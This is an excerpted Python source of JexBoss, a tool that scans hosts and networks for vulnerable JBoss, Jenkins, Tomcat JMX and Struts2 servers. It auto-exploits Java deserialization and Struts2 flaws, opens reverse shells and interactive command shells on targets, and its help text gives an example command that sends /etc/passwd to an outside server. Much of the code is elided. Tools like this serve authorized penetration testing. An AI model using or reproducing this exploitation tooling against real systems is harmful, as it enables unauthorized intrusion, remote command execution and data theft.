...
# logging.warning('Module readline not installed. The terminal will not support the arrow keys.', traceback)
# print_and_flush(RED1 + "\n * Module readline not installed. The terminal will not support the arrow keys.\n" + END)

logging.captureWarnings(True)
FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
logging.basicConfig(filename=f'jexboss_{str(datetime.datetime.today().date())}.log', format=FORMAT, level=logging.INFO)
...
if version_info[0] == 2 and version_info[1] < 7:
    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.6. The JexBoss requirements version >= 2.7.\n"
...
def is_proxy_ok():
    ...
    try:
        ...
        print_and_flush(((RED + (
                " * Error: Failed to connect to %s using proxy %s.\n   See logs for more details...\n" % (
            gl_args.host, gl_args.proxy))) + END))

        logging.warning(f"Failed to connect to {gl_args.host} using proxy", traceback)
        return False
    if r.status == 407:
        print_and_flush(((
                                 RED + " * Error 407: Proxy authentication is required. \n   Please enter the correct login and password for authentication. \n   Example: -P http://proxy.com:3128 -L username:password\n") + END))

        logging.error("Proxy authentication failed")
        return False
    elif r.status in [503, 502]:
        print_and_flush(((RED + (
                " * Error %s: The service %s is not availabel to your proxy. \n   See logs for more details...\n" % (
            r.status, gl_args.host))) + END))
...
def configure_http_pool():
    ...
    if gl_args.proxy:
        if gl_args.host is not None and 'http' not in gl_args.host or 'http' not in gl_args.proxy:
            print_and_flush(((RED + (
                        " * When using proxy, you must specify the http or https protocol (eg. http://%s).\n\n" % (
                    gl_args.host if 'http' not in gl_args.host else gl_args.proxy))) + END))
        ...
        try:
            if gl_args.proxy_cred:
                ...
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, proxy_headers=headers, timeout=timeout,
                                            cert_reqs='CERT_NONE')
            ...
            print_and_flush(
                RED + " * An error occurred while setting the proxy. Please see log for details..\n\n" + END)

            logging.critical('Error while setting the proxy', traceback)
            exit(1)
    else:
...
def check_connectivity(host, port):
    try:
        ...
        logging.info(f"Failed to connect to {host}:{port}. Error: {e}")
        return False
...
def check_vul(url):
    ...
    for vector in paths:
        ...
        try:
            ...
            if gl_args.jboss and vector not in (
                    'jmx-console', 'web-console', 'JMXInvokerServlet', 'admin-console'): continue
            ...
            print_and_flush(GREEN + " [*] Checking %s: %s" % (vector, " " * (27 - len(vector))) + END, same_line=True)
            ...
            # chek vul for Java Unserializable in Application Parameters
                ...
                if obj is None:
                    ...
                    if len(list_params) > 0:
                        paths[vector] = 110
                        print_and_flush(RED + "  [ CHECK OTHER PARAMETERS ]" + END)
                        print_and_flush(
                        ...
                        for p in list_params:
                            print_and_flush(GREEN + "      -H %s" % p + END)
                        print("")
            ...
            if paths[vector] in (301, 302, 303, 307, 308):
                ...
                if vector == "admin-console":
                    print_and_flush(RED + "  [ EXPOSED ]" + END)
                    logging.info("Server %s: EXPOSED" % url)
                elif vector == "Jenkins":
                    print_and_flush(RED + "  [ POSSIBLE VULNERABLE ]" + END)
                    logging.info("Server %s: RUNNING JENKINS" % url)
                elif vector == "JMX Tomcat":
                    print_and_flush(RED + "  [ MAYBE VULNERABLE ]" + END)
                    logging.info("Server %s: RUNNING JENKINS" % url)
                else:
                    print_and_flush(RED + "  [ VULNERABLE ]" + END)
                    logging.info("Server %s: VULNERABLE" % url)
            elif paths[vector] == 100:
                paths[vector] = 200
                print_and_flush(RED + "  [ INCONCLUSIVE - NEED TO CHECK ]" + END)
            ...
            logging.info("An error occurred while connecting to the host %s" % url, traceback)
            paths[vector] = 505
...
def auto_exploit(url, exploit_type):
    ...
    if exploit_type == "jmx-console":
        ...
        if result == 404:
            ...
            result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
                                                               cmd=gl_args.cmd, is_win=gl_args.windows,
                                                               gadget=gl_args.gadget,
        ...
        result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd,
                                                               is_win=gl_args.windows,
                                                               param=gl_args.post_parameter, force=gl_args.force,
                                                               gadget_type=gl_args.gadget,
                                                               show_payload=gl_args.show_payload,
                                                               gadget_file=gl_args.load_gadget)
        ...
        result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd,
                                                           is_win=gl_args.windows,
    ...
    if result == 200 or result == 500 or result == 201:
        ...
        if not gl_args.auto_exploit:
            ...
            if exploit_type in (
                    "Application Deserialization", "Jenkins", "JMX Tomcat", "Servlet Deserialization") or result == 201:
                print_and_flush(
                ...
                if exploit_type == 'Struts2':
                    ...
                    print_and_flush(
                        GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + END)
                    shell_http(url, exploit_type)

        # if auto exploit mode, print message and continue...
        else:
            print_and_flush(
                GREEN + " * Successfully deployed/sended code via vector %s\n *** Run JexBoss in Standalone mode "
                        "to open command shell. ***" % (exploit_type) + END)
            return True
    ...
    # if not exploited, print error messagem and ask for type enter
        ...
        if exploit_type == 'admin-console':
            ...
            print_and_flush(
                RED + "\n * Could not exploit the flaw automatically. Exploitation requirements manual analysis...\n" +
                "   Type [ENTER] to continue...\n" + END)
...
def ask_for_reverse_host_and_port():
    print_and_flush(
        GREEN + " * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.\n"
    ...
    if not sys.stdout.isatty():
        ...
        host = input("   IP Address (RHOST): ").lower() if version_info[0] >= 3 else input(
            "   IP Address (RHOST): ").lower()
...
def shell_http_struts(url):
    ...
    while True:
        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" + END)

        if not sys.stdout.isatty():
            print_and_flush("Shell> ", same_line=True)
            cmd = eval(input()) if version_info[0] >= 3 else input()
        else:
            cmd = eval(input("Shell> ")) if version_info[0] >= 3 else input("Shell> ")
...
def shell_http(url, shell_type):
    ...
    for cmd in ['uname -a', 'cat /etc/issue', 'id']:
        ...
        try:
            ...
            print_and_flush(
                RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n" + END)
            logging.warning("Disabling checking for updates.", traceback)
            headers['no-check-updates'] = 'true'
    ...
    while True:
        ...
        try:
            ...
            logging.error("Error contacting the command shell", traceback)
            continue
        ...
        if stdout.count("An exception occurred processing JSP page") == 1:
            print_and_flush(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + END)
        else:
...
def network_args(string):
    try:
        if version_info[0] >= 3:
            ...
            value = ipaddress.ip_network(str(string))
    except:
...
def main():
            ...
            if scan_results[vector] == 200 or scan_results[vector] == 500:
                ...
                if gl_args.auto_exploit:
                    ...
                    print_and_flush(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                                    BOLD + vector + NORMAL + "\" ?\n" +
                                    msg_confirm +
                                    RED + "   Continue only if you have permission!" + END)
                    if not sys.stdout.isatty():
                        print_and_flush("   yes/NO? ", same_line=True)
                        pick = input().lower() if version_info[0] >= 3 else input().lower()
                    else:
        ...
        for ip in gl_args.network.hosts():
            ...
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    ...
                    for key in list(ip_results.keys()):
                    ...
                    print_and_flush(RED + "\n * Host %s:%s does not respond." % (ip, port) + END)
        file_results.close()
    ...
    if vulnerables:
        banner()
        print_and_flush(RED + BOLD + " Results: potentially compromised server!" + END)
        if gl_args.mode == 'file-scan':
            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + END)
        elif gl_args.mode == 'auto-scan':
            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + END)
    ...
    # infos
    print_and_flush(END + " * Info: review, suggestions, updates, etc: \n" +
                    "   https://github.com/joaomatosf/jexboss\n")

    print_and_flush(
        GREEN + BOLD + " * DONATE: " + END + "Please consider making a donation to help improve this tool,\n" +
        GREEN + BOLD + " * Bitcoin Address: " + END + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n")
...
if __name__ == "__main__":
    ...
    parser.add_argument("--disable-check-updates", "-D", help="Disable two updates checks: 1) Check for updates "
                        ...
                        action='store_true')
    parser.add_argument('-mode', help="Operation mode (DEFAULT: standalone)",
                        choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
    ...
    parser.add_argument("--struts2", help="Check only for Struts2 Jakarta Multipart parser (CVE-2017-5638).",
                        action='store_true')
    ...
    parser.add_argument('--proxy', "-P",
                        help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
    parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)",
                        metavar='LOGIN:PASS')
    parser.add_argument('--jboss-login', "-J",
                        help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
    ...
    parser.add_argument('--cookies', type=str, metavar='NAME=VALUE',
                        help="Specify cookies for Struts 2 Exploit. Use this to test features that "
                             "require authentication. "
                             "Format: \"NAME1=VALUE1; NAME2=VALUE2\" "
                             "(eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\"")
    # parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)

    # advanced parameters ---------------------------------------------------------------------------------------
    group_advanced.add_argument("--reverse-host", "-r",
                                help="Remote host address and port for reverse shell when exploiting "
    ...
    group_advanced.add_argument("--cmd", "-x", type=str, metavar='CMD',
                                help="Send specific command to run on target "
                                     "(eg. curl -d @/etc/passwd http://your_server)")
    group_advanced.add_argument("--dns", help="Specifies the dns query for use with \"dns\" Gadget", type=str,
                                metavar='URL')
    group_advanced.add_argument("--windows", "-w",
                                help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
                                action='store_true')
    group_advanced.add_argument("--post-parameter", "-H",
                                help="Specify the parameter to find and inject serialized objects into it."
    ...
    group_advanced.add_argument("--gadget", help="Specify the type of Gadget to generate the payload automatically."
                                ...
                                choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20',
                                         'groovy1', 'dns'],
                                default='commons-collections3.1')
    group_advanced.add_argument("--load-gadget",
                                help="Provide your own gadget from file (a java serialized object in RAW mode)",
                                metavar='FILENAME')
